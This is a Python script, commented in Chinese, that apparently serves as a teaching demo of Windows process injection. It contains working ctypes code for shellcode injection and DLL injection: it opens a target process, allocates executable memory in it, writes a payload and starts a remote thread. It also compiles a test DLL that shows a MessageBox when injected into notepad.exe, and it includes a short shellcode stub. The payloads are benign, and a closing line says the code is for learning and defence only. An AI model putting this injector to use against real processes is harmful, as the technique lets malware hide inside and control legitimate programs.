import os
import ctypes
import sys
import time
from ctypes import wintypes

# 定义Windows API常量和结构
PAGE_EXECUTE_READWRITE = 0x40
PROCESS_ALL_ACCESS = 0x1F0FFF
VIRTUAL_MEM = (0x1000 | 0x2000)

class ProcessInjection:
    def __init__(self):
        # 加载Windows API
        self.kernel32 = ctypes.WinDLL('kernel32.dll', use_last_error=True)
        
        # 定义函数原型
        self.kernel32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
        self.kernel32.OpenProcess.restype = wintypes.HANDLE
        
        self.kernel32.VirtualAllocEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
        self.kernel32.VirtualAllocEx.restype = wintypes.LPVOID
        
        self.kernel32.WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
        self.kernel32.WriteProcessMemory.restype = wintypes.BOOL
        
        self.kernel32.CreateRemoteThread.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.LPVOID, wintypes.LPVOID, wintypes.DWORD, wintypes.LPDWORD]
        self.kernel32.CreateRemoteThread.restype = wintypes.HANDLE
        
        self.kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
        self.kernel32.CloseHandle.restype = wintypes.BOOL
        
        self.kernel32.GetProcAddress.argtypes = [wintypes.HMODULE, wintypes.LPCSTR]
        self.kernel32.GetProcAddress.restype = wintypes.LPVOID
        
        self.kernel32.LoadLibraryA.argtypes = [wintypes.LPCSTR]
        self.kernel32.LoadLibraryA.restype = wintypes.HMODULE
    
    def get_process_id(self, process_name):
        """获取进程ID"""
        try:
            import psutil
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] == process_name:
                    return proc.info['pid']
            return None
        except Exception as e:
            print(f"获取进程ID时出错: {str(e)}")
            return None
    
    def simple_shellcode_injection(self, pid, shellcode):
        """简单的Shellcode注入"""
        print(f"\n--- 开始Shellcode注入到进程 {pid} ---")
        
        try:
            # 打开目标进程
            h_process = self.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
            if not h_process:
                raise Exception(f"无法打开进程: {ctypes.get_last_error()}")
            print(f"成功打开进程，句柄: {h_process}")
            
            # 在目标进程中分配内存
            shellcode_size = len(shellcode)
            remote_memory = self.kernel32.VirtualAllocEx(h_process, None, shellcode_size, VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)
            if not remote_memory:
                raise Exception(f"无法分配内存: {ctypes.get_last_error()}")
            print(f"成功分配内存，地址: {remote_memory}")
            
            # 写入Shellcode到目标进程
            bytes_written = ctypes.c_size_t(0)
            result = self.kernel32.WriteProcessMemory(h_process, remote_memory, shellcode, shellcode_size, ctypes.byref(bytes_written))
            if not result:
                raise Exception(f"无法写入内存: {ctypes.get_last_error()}")
            print(f"成功写入 {bytes_written.value} 字节的Shellcode")
            
            # 创建远程线程执行Shellcode
            h_thread = self.kernel32.CreateRemoteThread(h_process, None, 0, remote_memory, None, 0, None)
            if not h_thread:
                raise Exception(f"无法创建远程线程: {ctypes.get_last_error()}")
            print(f"成功创建远程线程，句柄: {h_thread}")
            
            # 等待线程完成
            time.sleep(2)
            
            # 关闭句柄
            self.kernel32.CloseHandle(h_thread)
            self.kernel32.CloseHandle(h_process)
            
            print("Shellcode注入成功完成")
            return True
        except Exception as e:
            print(f"Shellcode注入失败: {str(e)}")
            return False
    
    def dll_injection(self, pid, dll_path):
        """DLL注入"""
        print(f"\n--- 开始DLL注入到进程 {pid} ---")
        
        try:
            # 打开目标进程
            h_process = self.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
            if not h_process:
                raise Exception(f"无法打开进程: {ctypes.get_last_error()}")
            print(f"成功打开进程，句柄: {h_process}")
            
            # 获取LoadLibraryA的地址
            h_kernel32 = self.kernel32.LoadLibraryA(b"kernel32.dll")
            load_library_addr = self.kernel32.GetProcAddress(h_kernel32, b"LoadLibraryA")
            if not load_library_addr:
                raise Exception(f"无法获取LoadLibraryA地址: {ctypes.get_last_error()}")
            print(f"LoadLibraryA地址: {load_library_addr}")
            
            # 计算DLL路径的大小
            dll_path_bytes = dll_path.encode('utf-8') + b'\x00'
            dll_path_size = len(dll_path_bytes)
            
            # 在目标进程中分配内存
            remote_memory = self.kernel32.VirtualAllocEx(h_process, None, dll_path_size, VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)
            if not remote_memory:
                raise Exception(f"无法分配内存: {ctypes.get_last_error()}")
            print(f"成功分配内存，地址: {remote_memory}")
            
            # 写入DLL路径到目标进程
            bytes_written = ctypes.c_size_t(0)
            result = self.kernel32.WriteProcessMemory(h_process, remote_memory, dll_path_bytes, dll_path_size, ctypes.byref(bytes_written))
            if not result:
                raise Exception(f"无法写入内存: {ctypes.get_last_error()}")
            print(f"成功写入 {bytes_written.value} 字节的DLL路径")
            
            # 创建远程线程执行LoadLibraryA
            h_thread = self.kernel32.CreateRemoteThread(h_process, None, 0, load_library_addr, remote_memory, 0, None)
            if not h_thread:
                raise Exception(f"无法创建远程线程: {ctypes.get_last_error()}")
            print(f"成功创建远程线程，句柄: {h_thread}")
            
            # 等待线程完成
            time.sleep(2)
            
            # 关闭句柄
            self.kernel32.CloseHandle(h_thread)
            self.kernel32.CloseHandle(h_process)
            
            print("DLL注入成功完成")
            return True
        except Exception as e:
            print(f"DLL注入失败: {str(e)}")
            return False
    
    def create_test_dll(self, output_path):
        """创建测试DLL"""
        print(f"\n--- 创建测试DLL: {output_path} ---")
        
        # 简单的DLL代码
        dll_code = '''
#include <Windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // 当DLL被加载时执行
        MessageBox(NULL, L"DLL已成功注入！", L"注入测试", MB_OK);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
'''
        
        # 保存DLL代码到文件
        with open("test_dll.cpp", "w") as f:
            f.write(dll_code)
        
        # 使用MinGW编译DLL（需要安装MinGW）
        try:
            import subprocess
            result = subprocess.run(["g++", "-shared", "-o", output_path, "test_dll.cpp"], capture_output=True, text=True)
            if result.returncode == 0:
                print(f"测试DLL创建成功: {output_path}")
                # 清理临时文件
                if os.path.exists("test_dll.cpp"):
                    os.remove("test_dll.cpp")
                return True
            else:
                print(f"编译失败: {result.stderr}")
                return False
        except Exception as e:
            print(f"创建测试DLL时出错: {str(e)}")
            return False
    
    def demonstrate_injection_techniques(self):
        """演示注入技术"""
        print("=== 进程注入技术演示 ===")
        print("========================")
        
        # 1. 显示注入技术列表
        print("\n1. 注入技术列表:")
        injection_techniques = [
            "Shellcode注入",
            "DLL注入",
            "代码注入",
            "APC注入",
            "线程劫持",
            "反射DLL注入"
        ]
        for i, technique in enumerate(injection_techniques, 1):
            print(f"   {i}. {technique}")
        
        # 2. 获取目标进程ID
        print("\n2. 获取目标进程ID:")
        target_process = "notepad.exe"
        pid = self.get_process_id(target_process)
        
        if not pid:
            print(f"请先启动 {target_process} 进程")
            return
        
        print(f"目标进程 {target_process} 的PID: {pid}")
        
        # 3. 演示DLL注入
        print("\n3. 演示DLL注入:")
        test_dll = "test_injection.dll"
        if self.create_test_dll(test_dll):
            self.dll_injection(pid, os.path.abspath(test_dll))
            # 清理测试DLL
            if os.path.exists(test_dll):
                time.sleep(2)
                os.remove(test_dll)
        
        # 4. 演示Shellcode注入
        print("\n4. 演示Shellcode注入:")
        # 简单的 MessageBox Shellcode (x86)
        # 注意：此Shellcode仅适用于32位进程
        shellcode = b"\x31\xc0\x50\x68\x4d\x65\x73\x73\x68\x61\x67\x65\x42\x68\x49\x6e\x6a\x65\x8b\xc4\x50\x50\x53\xb8\x00\x00\x00\x00\xff\xd0"
        
        # 替换MessageBox地址（这里只是示例，实际使用需要动态获取）
        # 注意：此Shellcode可能无法在所有系统上运行，仅作演示
        print("Shellcode注入示例（注意：实际Shellcode需要根据目标系统进行调整）")
        print(f"Shellcode长度: {len(shellcode)} 字节")
        
        print("\n=== 演示完成 ===")
        print("通过本演示，你了解了进程注入的基本原理和实现方法。")
        print("请注意：这些技术仅用于学习和防御目的，请勿用于非法活动。")

if __name__ == "__main__":
    if sys.platform != "win32":
        print("此演示仅在Windows平台上运行")
        sys.exit(1)
    
    injection = ProcessInjection()
    injection.demonstrate_injection_techniques()